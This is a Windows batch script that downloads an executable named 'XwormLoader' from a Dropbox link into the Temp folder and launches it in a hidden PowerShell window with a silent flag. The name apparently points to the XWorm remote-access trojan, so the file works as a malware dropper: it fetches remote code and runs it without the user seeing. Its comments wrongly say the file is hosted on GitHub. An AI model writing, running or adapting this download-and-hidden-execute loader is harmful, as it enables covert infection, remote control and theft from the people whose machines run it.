@echo off
setlocal

:: Set the URL for the .exe file hosted on GitHub
set exe_url=https://www.dropbox.com/scl/fi/uvgqapcr11d1v0w7f18tf/XwormLoader.exe?rlkey=dzz9evowhrfb63cciwx2o8zq5&st=fe3r89yk&dl=1

:: Define where to save the .exe file (e.g., in the Temp folder)
set exe_path=%TEMP%\XwormLoaderV5.6.exe

:: Download the .exe file from GitHub
curl -L -o "%exe_path%" "%exe_url%"

:: Check if the file was successfully downloaded
if exist "%exe_path%" (
    echo File downloaded successfully. Running it hidden...
    
    :: Run the .exe file hidden using PowerShell (to hide the window)
    powershell -WindowStyle Hidden -Command Start-Process "%exe_path%" -ArgumentList "/S" 
) else (
    echo Failed to download the file.
)

endlocal
